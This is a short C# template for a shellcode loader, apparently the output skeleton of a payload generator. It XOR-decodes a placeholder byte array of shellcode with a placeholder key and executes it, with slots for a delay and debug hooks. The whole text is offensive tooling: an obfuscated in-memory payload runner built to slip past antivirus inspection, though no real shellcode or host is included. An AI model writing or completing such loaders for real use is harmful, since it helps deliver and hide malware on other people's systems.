    public static class CLASSNAME_PH
    {
        public static void Run()
        {
            byte[] enc = new byte[] { SHELLCODE_PH };
            byte[] xk = new byte[] { XORKEY_PH };
            byte[] sc = new byte[enc.Length];
            for (int i = 0; i < enc.Length; i++) sc[i] = (byte)(enc[i] ^ xk[i % xk.Length]);
DBG_DECRYPTED_PH
DELAY_PH
DBG_EXEC_PH
            Exec.Run(sc);
        }
    }
